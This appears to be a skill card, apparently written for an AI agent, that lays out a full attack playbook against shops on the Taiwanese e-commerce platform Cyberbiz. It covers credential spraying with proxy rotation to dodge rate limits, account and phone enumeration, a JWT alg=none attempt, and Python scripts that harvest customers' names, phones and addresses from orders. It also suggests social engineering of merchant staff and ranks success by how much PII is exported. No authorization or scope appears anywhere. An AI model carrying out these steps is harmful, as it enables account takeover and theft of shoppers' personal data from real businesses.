---
name: 商燕飞·商云
description: >-
  Cyberbiz 台湾电商 SaaS 平台渗透。触发: cyberbiz.co、cyberbiz.io、
  cybassets.com、shop_add_ons、board_comments_token、CYBERBIZ_SETTINGS、
  Devise sign_in、Doorkeeper OAuth。适用于所有托管在 Cyberbiz 上的商店。
version: 1.0.0
author: 大爱仙尊
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, cyberbiz, ecommerce, saas, taiwan, daaixianzun]
    category: daaixianzun
---

> **商燕飞**
> 商道无亲利字先，一城风雨一城钱。
> 燕飞南北皆为市，账本比剑更锋寒。

# Cyberbiz 台湾电商 SaaS 平台渗透

## 触发条件

以下任一命中即启用本卡：

- 域名含 `cyberbiz.co` / `cyberbiz.io` / `cybassets.com`
- 页面 JS 含 `window.CYBERBIZ_SETTINGS` / `window.c12t`
- 静态资源走 `cdn-general.cybassets.com`
- 响应头 `X-Request-Id` + Rails 风格 session cookie（676+ 字节 base64）
- 登录页 `/customer/auth/line` / `/account/login` + Devise 风格
- 后台 `<shop>.cyberbiz.co/user/sign_in`（Devise + Doorkeeper）
- 页面源码含 `shop_add_ons`（base64 JSON）/ `board_comments_token`
- API 文档 `api-doc.cyberbiz.co`

**不要走这张卡**

| 指纹 | 走 |
|------|---|
| 自建 Rails 站（无 cyberbiz 域） | 通用 Rails pentest |
| Shopify / LINE LIFF 独立应用 | 对应专卡 |
| 芋道 / FastAdmin / GVA | 各自专卡 |

## 平台架构（经验总结）

```
商店前端: www.<shop>.com.tw（自定义域）→ CNAME/A → Cyberbiz AWS 集群
商店后台: <shop>.cyberbiz.co（Devise + Doorkeeper OAuth）
REST API: api.cyberbiz.co（HMAC-SHA256 签名认证）
App Store: app-store-api.cyberbiz.io（OAuth Bearer）
评论 API: board.cyberbiz.co（JWT HS256）
聊天 API: message.cyberbiz.io（widget_key）
静态 CDN: cdn-general.cybassets.com
API 文档: api-doc.cyberbiz.co（Basic Auth，demo: apidemo/apidemo）
合作伙伴: partner.cyberbiz.io（独立登录系统）
开发者门户: developer.cyberbiz.io → 跳 cyberbiz.io/trial
```

## 平台安全特征（已验证）

- **ISO 27001 + PCI DSS** 认证 SaaS，安全水位高于一般自建站
- **WAF**：检测 SQL 关键词（UNION/SLEEP/EXTRACTVALUE）→ 立即 403
- **IP 限速**：admin 登录 ~5 次/IP 触发 429；会员登录 ~100 次触发 429
- **CSRF**：全面 authenticity_token（Rails CSRF）
- **Session**：Rails 加密 cookie（~676 字节），需 `secret_key_base` 才能伪造
- **IDOR 防护**：订单用 UUID v1（不可枚举），ID 参数被忽略
- **OAuth**：Doorkeeper，仅支持 authorization_code grant
- **租户隔离**：API 参数注入 shop_id/shop_domain 无效，严格绑定凭据
- **无公开已知 CVE**

## 杀伤链（按优先级）

### P0：弱口碰撞（最可能的突破口）

**核心发现**：台湾企业常用公司统一编号（统编，8 位数字）作为密码。

```
密码字典优先级：
1. 公司统编（台湾经济部查询：https://findbiz.nat.gov.tw/）
2. 统编 + 常见后缀：{统编}!、{统编}@、{统编}123
3. 品牌名变体：{brand}123、{brand}2024、{brand}!@#
4. 邮箱前缀：info123、admin123、{name}123
5. 常见弱口：Aa123456、Qwer1234、P@ssw0rd
```

**会员登录**：`POST /customer/sessions` + authenticity_token
**后台登录**：`POST <shop>.cyberbiz.co/user/sign_in` + user[email] + user[password]

限速应对：通过 `config/proxy-nodes.txt` 代理轮转，每个 IP 打 3-4 次后换。

### P1：信息收集（无需认证）

#### 1. 页面 JS 对象提取

```python
# 从首页 HTML 提取 window.c12t
import re, requests
r = requests.get('https://www.<shop>.com.tw/')
c12t = re.search(r'window\.c12t\s*=\s*({.*?});', r.text)
# 含 customer_id, email, mobile, orders_count, total_spent
```

#### 2. shop_add_ons 解码

```python
import base64, json, re
# 从页面源码找 base64 编码的 shop_add_ons
b64 = re.search(r'shop_add_ons["\s]*[:=]\s*["\']([A-Za-z0-9+/=]+)', html)
apps = json.loads(base64.b64decode(b64.group(1)))
# 暴露：已安装应用列表、app_id、widget_key、GA4 追踪 ID
```

#### 3. Board JWT 获取

```
GET /account/board_comments_token.json
→ {"success":true,"token":"eyJ...","user_key":"..."}

JWT payload 含：
- public_key = "{shop_id}-{shop_handle}-{frontend_api_key}"  ← 三合一泄露
- user_key = 用户标识哈希
- user_name = 用户名
```

**关键**：`public_key` 字段直接泄露 `shop_id`、`shop_handle`、`frontend_api_key`。

#### 4. 账号存在性枚举

```
POST /account/customer/password  （密码重置）
  email=existing@xxx.com → 302 → /account/login（存在）
  email=noone@xxx.com   → 302 → /account/login#recover（不存在）
```

#### 5. 手机号枚举

```
POST /guest/confirmation  （短信验证）
  phone=0912345678 → 返回结果可区分是否已注册
  注意：3 次后 429
```

#### 6. 无授权数据

```
GET /collections/all-item.json     → 全部商品（无 PII）
GET /sitemap.xml                   → 页面结构
GET /cart.json / /cart.js          → 购物车结构
GET /.well-known/assetlinks.json   → 可能泄露 S3 桶名
```

### P2：评论 API 利用

```python
# Board API 支持 alg=none（已验证）
# 但只能读打码姓名的评论，无手机/邮箱/订单号
import requests
headers = {'Authorization': f'Bearer {jwt_token}'}
r = requests.get(
    'https://board.cyberbiz.co/api/v1/comments',
    params={'board_key': f'product_{product_id}', 'page': 1, 'per_page': 50},
    headers=headers
)
```

评论只含打码姓名（如「許*民」），不可用于横向突破，但可确认商品人气。

### P3：会员登录后

#### 订单数据提取

```python
# 登录后提取全部订单 UUID
r = session.get('/account/orders')
uuids = re.findall(r'/account/orders/([a-f0-9]{32})', r.text)

# 逐单提取详情（收件人/手机/地址/商品/金额/运单）
for uuid in uuids:
    r = session.get(f'/account/orders/{uuid}')
    # 解析 HTML：recipient, phone, address, products, total, tracking
```

#### IDOR 测试（已验证阴性但必须做）

```
GET /account/orders/{other_uuid}  → 404（严格隔离）
GET /account/check_login.json?id={other_id}  → 忽略参数，返回当前用户
地址 ID 邻居值  → 无效
```

#### 地址簿提取

```
GET /account/addresses → 包含所有已保存的收件人信息
```

### P4：后台突破路线

| 路线 | 方法 | 难度 |
|------|------|------|
| Admin 暴破 | `<shop>.cyberbiz.co/user/sign_in` + 代理轮转 | 中（429 限速） |
| HMAC API | 需从后台「设定→API」获取 username:secret | 高（需先进后台） |
| LINE OAuth 横跳 | 用台湾 LINE 账号建新会员测 IDOR | 中（需 LINE 号） |
| SMS 注册 | +886 手机 4 位验证码，captcha 可能已关闭 | 中（需手机号） |
| 社工 | 联系商家客服套取后台截图或 API 凭据 | 低技术 |

### P5：HMAC API 认证（有凭据时）

```python
import hmac, hashlib, email.utils

username = '<shop_username>'
secret = '<shop_secret>'
date = email.utils.formatdate(usegmt=True)
request_line = 'GET /v1/orders HTTP/1.1'
sign_string = f'x-date: {date}\n{request_line}'
signature = base64.b64encode(
    hmac.new(secret.encode(), sign_string.encode(), hashlib.sha256).digest()
).decode()

headers = {
    'x-date': date,
    'Authorization': f'hmac username="{username}", algorithm="hmac-sha256", '
                     f'headers="x-date request-line", signature="{signature}"'
}
r = requests.get('https://api.cyberbiz.co/v1/orders', headers=headers)
```

API 端点（来自 api-doc.cyberbiz.co）：
- `/v1/orders` — 全部订单
- `/v1/customers` — 全部客户
- `/v1/products` — 全部商品
- `/v1/webhooks` — Webhook 管理

## 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| L0 | 指纹确认 Cyberbiz + shop_id/frontend_api_key 泄露 | 只看到登录页 |
| L1 | 会员弱口命中 + 个人订单/地址簿提取 | 只枚举出邮箱存在 |
| L2 | 会员订单完整 PII 提取（姓名+手机+地址） | 只有订单号无 PII |
| L3 | Admin 后台进入 或 HMAC API 凭据获取 | 会员票不算 admin |
| L4 | 全站订单导出（/admin/orders.xlsx 或 API） | 只有自己的订单 |

## 失败处理

- 弱口全灭 → 不要死磕暴破，转 LINE OAuth / SMS 注册路线
- API 401 → 确认 HMAC 签名格式正确（x-date 必须 GMT，request-line 含 HTTP/1.1）
- 429 → 换代理节点，单 IP 不超过 3 次
- WAF 403 → 放弃 SQLi，Cyberbiz 的 WAF 对关键词检测很严
- 评论 JWT DecodeError → Board API 可能版本变动，尝试 alg=none 或其他传参方式
- 全技术面穷尽 → 明确报告「Cyberbiz SaaS 平台级防护，需 admin 凭据或台湾 LINE/手机号」

## 输出

```
案卷/<case>/
├── 接管/
│   ├── orders_detailed.json       # 订单完整数据
│   ├── orders_detailed.csv        # CSV 格式
│   ├── orders_recipients.csv      # 收件人清单
│   ├── order_uuids.json           # UUID 列表
│   ├── board_comments.json        # 商品评论
│   ├── address_book.json          # 地址簿
│   ├── login_ok.txt               # 凭据记录
│   └── profile_snip.txt           # 客户 JS 对象
├── 案卷/
│   ├── origin.json                # Origin IP
│   ├── cdn_tracer_origin.json     # CDN 追踪
│   ├── js_secrets.json            # JS 密钥搜索
│   └── object_matrix.md           # 对象矩阵
└── STATUS.md
```

## 注意

1. Cyberbiz 是多租户 SaaS，**禁止**通过 shop_id 参数尝试访问其他商店数据
2. 评论 API 的打码姓名是平台行为，不是我们脱的敏
3. 台湾统编查询：https://findbiz.nat.gov.tw/ （公开信息）
4. LINE OAuth client_id 从 `/customer/auth/line` 302 跳转 URL 提取
5. 母公司站（如 WP）是有价值的旁路，但通常也有独立防护

## 真源

- 手法：`传承/凤九歌·天地歌.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
